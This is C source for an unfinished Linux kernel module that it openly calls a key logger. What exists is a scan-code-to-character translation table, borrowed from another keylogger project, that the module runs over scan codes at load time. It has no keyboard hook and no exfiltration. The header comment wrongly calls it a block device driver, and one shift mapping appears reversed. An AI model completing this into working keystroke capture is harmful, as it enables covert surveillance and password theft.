/*
 *    PURPOSE - A block device driver for a virtual block device of my own creation
 */

/////////////
/* HEADERS */
/////////////
#include <linux/kernel.h>                       // ALWAYS NEED
#include <linux/module.h>                       // ALWAYS NEED

////////////
/* MACROS */
////////////
#define DEVICE_NAME "My Key Logger"            // Use this macro for logging
#define HARKLE_KERROR(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
#define HARKLE_KINFO(module, msg) do { printk(KERN_INFO "%s: %s\n", module, msg); } while (0);
#define BUFF_SIZE 16                           // Size of the out buffer
#ifndef TRUE
#define TRUE 1
#endif  // TRUE
#ifndef FALSE
#define FALSE 0
#endif  // FALSE

//////////////
/* TYPEDEFS */
//////////////
typedef struct _myKeyLogger
{
    char keyStr[BUFF_SIZE + 1];
} myKeyLogger, *myKeyLogger_ptr;

/////////////////////////
/* FUNCTION PROTOTYPES */
/////////////////////////
// PURPOSE - LKM init function
static int __init key_logger_init(void);
// PURPOSE - LKM exit function
static void __exit key_logger_exit(void);
// PURPOSE - Translate scan code to 'key' string
static int translate_code(unsigned char scanCode);

/////////////
/* GLOBALS */
/////////////
myKeyLogger myKL;
int shift;

//////////////////////////
/* FUNCTION DEFINITIONS */
//////////////////////////
static int __init key_logger_init(void)
{
    int retVal = 0;
    unsigned char i = 0;  // DEBUGGING
    
    HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING

    // Initialize Globals
    // 1. Initialize myKeyLogger struct
    memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
    // 2. shift
    shift = FALSE;

    // DEBUGGING
    for (i = 0; i <= 85; i++)
    {
        translate_code(i);
    }
    
    // DONE
    HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
    return retVal;
}

static void __exit key_logger_exit(void)
{
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
    // Code here
    
    // DONE
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
}

static int translate_code(unsigned char scanCode)
{
    int retVal = 0;
    char *tempRetVal = NULL;

    // 1. Zeroize the buffer
    memset(myKL.keyStr, 0x0, BUFF_SIZE);

    // 2. Translate and copy in the string
    // This switch statement was lifted from:
    // https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c
    switch(scanCode)
    {
        case 0:
            tempRetVal = myKL.keyStr; break;
        case 1:
            tempRetVal = strncpy(myKL.keyStr, "(ESC)", BUFF_SIZE); break;
        case 2:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "!" : "1", BUFF_SIZE); break;
        case 3:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "@" : "2", BUFF_SIZE); break;
        case 4:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "#" : "3", BUFF_SIZE); break;
        case 5:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "$" : "4", BUFF_SIZE); break;
        case 6:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "%" : "5", BUFF_SIZE); break;
        case 7:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "^" : "6", BUFF_SIZE); break;
        case 8:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "&" : "7", BUFF_SIZE); break;
        case 9:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "*" : "8", BUFF_SIZE); break;
        case 10:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "(" : "9", BUFF_SIZE); break;
        case 11:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? ")" : "0", BUFF_SIZE); break;
        case 12:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "_" : "-", BUFF_SIZE); break;
        case 13:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "+" : "=", BUFF_SIZE); break;
        case 14:
            tempRetVal = strncpy(myKL.keyStr, "(BACK)", BUFF_SIZE); break;
        case 15:
            tempRetVal = strncpy(myKL.keyStr, "(TAB)", BUFF_SIZE); break;
        case 16:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "Q" : "q", BUFF_SIZE); break;
        case 17:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "W" : "w", BUFF_SIZE); break;
        case 18:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "E" : "e", BUFF_SIZE); break;
        case 19:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "R" : "r", BUFF_SIZE); break;
        case 20:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "T" : "t", BUFF_SIZE); break;
        case 21:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "Y" : "y", BUFF_SIZE); break;
        case 22:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "U" : "u", BUFF_SIZE); break;
        case 23:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "I" : "i", BUFF_SIZE); break;
        case 24:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "O" : "o", BUFF_SIZE); break;
        case 25:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "P" : "p", BUFF_SIZE); break;
        case 26:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "{" : "[", BUFF_SIZE); break;
        case 27:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "}" : "]", BUFF_SIZE); break;
        case 28:
            tempRetVal = strncpy(myKL.keyStr, "(ENTER)", BUFF_SIZE); break;
        case 29:
            tempRetVal = strncpy(myKL.keyStr, "(CTRL)", BUFF_SIZE); break;
        case 30:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "A" : "a", BUFF_SIZE); break;
        case 31:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "S" : "s", BUFF_SIZE); break;
        case 32:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "D" : "d", BUFF_SIZE); break;
        case 33:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "F" : "f", BUFF_SIZE); break;
        case 34:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "G" : "g", BUFF_SIZE); break;
        case 35:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "H" : "h", BUFF_SIZE); break;
        case 36:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "J" : "j", BUFF_SIZE); break;
        case 37:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "K" : "k", BUFF_SIZE); break;
        case 38:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "L" : "l", BUFF_SIZE); break;
        case 39:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? ":" : ";", BUFF_SIZE); break;
        case 40:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "\"" : "'", BUFF_SIZE); break;
        case 41:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "~" : "`", BUFF_SIZE); break;
        case 42:
        case 54:
            shift = 1; tempRetVal = myKL.keyStr; break;
        case 170:
        case 182:
            shift = 0; tempRetVal = myKL.keyStr; break;
        case 43:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "\\" : "|", BUFF_SIZE); break;
        case 44:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "Z" : "z", BUFF_SIZE); break;
        case 45:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "X" : "x", BUFF_SIZE); break;
        case 46:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "C" : "c", BUFF_SIZE); break;
        case 47:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "V" : "v", BUFF_SIZE); break;
        case 48:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "B" : "b", BUFF_SIZE); break;
        case 49:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "N" : "n", BUFF_SIZE); break;
        case 50:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "M" : "m", BUFF_SIZE); break;
        case 51:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "<" : ",", BUFF_SIZE); break;
        case 52:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? ">" : ".", BUFF_SIZE); break;
        case 53:
            tempRetVal = strncpy(myKL.keyStr, (shift) ? "?" : "/", BUFF_SIZE); break;
        case 56:
            tempRetVal = strncpy(myKL.keyStr, "(R-ALT)", BUFF_SIZE); break;
        case 69:
            tempRetVal = strncpy(myKL.keyStr, "(NUM)", BUFF_SIZE); break;
        /* Space */
        case 55:
        case 57:
        case 58:
        case 59:
        case 60:
        case 61:
        case 62:
        case 63:
        case 64:
        case 65:
        case 66:
        case 67:
        case 68:
        case 70:
        case 71:
        case 72:
            tempRetVal = strncpy(myKL.keyStr, " ", BUFF_SIZE); break;
        case 73:
            tempRetVal = strncpy(myKL.keyStr, "(PGUP)", BUFF_SIZE); break;
        case 74:
            tempRetVal = strncpy(myKL.keyStr, "-", BUFF_SIZE); break;
        case 75:
            tempRetVal = strncpy(myKL.keyStr, "(LEFT)", BUFF_SIZE); break;
        case 76:
            tempRetVal = strncpy(myKL.keyStr, "(KPD5)", BUFF_SIZE); break;
        case 77:
            tempRetVal = strncpy(myKL.keyStr, "(RIGHT)", BUFF_SIZE); break;
        case 78:
            tempRetVal = strncpy(myKL.keyStr, "+", BUFF_SIZE); break;
        case 79:
            tempRetVal = strncpy(myKL.keyStr, "(END)", BUFF_SIZE); break;
        case 80:
            tempRetVal = strncpy(myKL.keyStr, "(DOWN)", BUFF_SIZE); break;
        case 81:
            tempRetVal = strncpy(myKL.keyStr, "(PGDN)", BUFF_SIZE); break;
        case 82:
            tempRetVal = strncpy(myKL.keyStr, "(INS)", BUFF_SIZE); break;
        case 83:
            tempRetVal = strncpy(myKL.keyStr, "(DEL)", BUFF_SIZE); break;
        case 84:
            tempRetVal = strncpy(myKL.keyStr, "(SYSRQ)", BUFF_SIZE); break;
        default:
            printk(KERN_INFO "%s: translate_code() received unsupported scan code of %u.\n", DEVICE_NAME, scanCode);  // DEBUGGING
            tempRetVal = myKL.keyStr;
            break;
    }

    if (tempRetVal != myKL.keyStr || NULL == tempRetVal)
    {
        retVal = -1;
    }
    else if (*tempRetVal)
    {
        printk(KERN_INFO "%s: Translated %u into '%s'\n", DEVICE_NAME, scanCode, myKL.keyStr);  // DEBUGGING
    }

    return retVal;
}

module_init(key_logger_init);
module_exit(key_logger_exit);

////////////////////////
/* DRIVER INFORMATION */
////////////////////////
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
MODULE_VERSION("0.1"); // Not yet releasable
